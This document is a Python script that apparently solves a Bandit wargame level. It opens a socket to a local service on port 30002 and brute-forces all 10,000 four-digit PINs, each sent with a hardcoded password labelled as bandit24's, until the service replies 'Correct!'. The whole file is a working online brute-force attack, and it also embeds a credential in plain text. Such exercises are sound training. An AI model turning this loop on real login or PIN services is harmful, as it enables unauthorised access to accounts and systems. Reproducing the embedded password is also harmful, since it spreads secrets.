#!/usr/bin/env python3

import socket
import sys

# Configuration for the connection
host = 'localhost'
port = 30002
bandit24_password = 'VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar' # Replace with the actual password for bandit24

def main():
    # Establish a socket connection to the server
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        
        # Receive the initial prompt from the server
        prompt = s.recv(1024).decode()
        print(prompt.strip())

        # Iterate through all 4-digit PINs
        for pin in range(10000):
            # Construct the message: bandit24 password followed by the PIN
            pin_formatted = f"{pin:04}"
            message = f"{bandit24_password} {pin_formatted}\n"
            s.sendall(message.encode())
            
            # Receive and print the server response
            response = s.recv(1024).decode()
            print(f"\rTrying PIN: {pin_formatted}", end='')
            sys.stdout.flush()

            if "Correct!" in response:
                print(f"\nFound correct PIN: {pin_formatted}")
                print(response.strip())
                break
            else:
                # Optionally, print the response if you want to see the "Wrong" attempts
                # print(response.strip())
                pass

if __name__ == "__main__":
    main()
